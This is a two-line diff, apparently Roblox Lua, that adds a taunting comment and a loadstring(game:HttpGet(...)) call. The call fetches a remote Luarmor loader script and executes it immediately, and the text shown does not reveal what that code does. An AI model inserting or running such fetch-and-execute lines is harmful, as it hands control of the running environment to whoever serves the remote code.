@@ -1,0 +1,2 @@
+-- lol get luarmored kid
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/0ea1792ead5409e184f1c1859f04a555.lua"))()
